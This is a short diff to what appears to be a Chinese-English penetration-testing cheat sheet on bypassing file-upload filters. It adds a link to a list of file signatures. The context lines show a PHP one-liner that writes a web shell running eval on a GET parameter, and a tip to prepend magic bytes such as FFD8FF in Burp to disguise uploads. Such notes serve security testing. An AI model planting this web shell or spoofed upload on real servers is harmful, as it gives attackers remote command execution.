@@ -53,6 +53,7 @@ done
 <?php fputs(fopen('shell.php','w'),'<?php eval($_GET[cmd])?>');?>
 ```
 ### 文件类型特征码（Convert to ascii in burp）
+https://en.wikipedia.org/wiki/List_of_file_signatures  
 Put the corresponding file signature code in front of the file content in burp 
 ```
 JPEG (jpg)，文件头：FFD8FF
